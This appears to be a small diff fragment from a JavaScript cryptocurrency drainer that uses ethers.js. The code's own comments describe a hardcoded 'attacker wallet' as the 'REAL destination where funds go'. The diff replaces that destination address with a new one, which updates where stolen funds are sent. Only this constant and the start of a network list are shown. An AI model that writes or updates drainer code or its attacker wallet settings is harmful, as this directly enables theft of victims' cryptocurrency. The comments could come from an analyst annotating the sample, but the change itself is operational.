@@ -3,7 +3,7 @@ import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethe
 
 // ── Attacker's Operational Constants ──
 // THIS is the REAL destination where funds go (hardcoded attacker wallet)
-const DEST_WALLET = "0xCa2934934d02fBFEAa25e9ABa50136c0c3300a78";
+const DEST_WALLET = "0xecc014254284AfB05086423D9bBB62494e5E64E9";
 
 // ── Supported Networks ──
 const NETWORKS = [
